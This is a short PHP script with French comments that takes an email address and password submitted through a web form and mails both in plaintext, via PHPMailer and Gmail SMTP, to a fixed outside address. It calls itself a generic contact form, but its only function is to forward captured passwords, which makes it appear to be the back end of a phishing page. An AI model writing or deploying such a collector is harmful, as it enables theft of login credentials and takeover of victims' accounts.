<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $motdepasse = $_POST['password'];

    $mail = new PHPMailer(true);

    try {
        // Configuration du serveur SMTP
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com'; // Remplacez par votre serveur SMTP
        $mail->SMTPAuth   = true;
        $mail->Username   = 'votre_email@gmail.com'; // Remplacez par votre adresse e-mail
        $mail->Password   = 'votre_mot_de_passe';    // Remplacez par votre mot de passe
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        // Destinataires
        $mail->setFrom('votre_email@gmail.com', 'Formulaire PHP');
        $mail->addAddress('destinataire@example.com'); // Remplacez par l'adresse du destinataire

        // Contenu de l'e-mail
        $mail->isHTML(true);
        $mail->Subject = 'Nouveau message depuis le formulaire';
        $mail->Body    = "Adresse email: $email <br> Mot de passe: $motdepasse";

        $mail->send();
        echo "Message envoyé avec succès !";
    } catch (Exception $e) {
        echo "Erreur lors de l'envoi : {$mail->ErrorInfo}";
    }
}
?>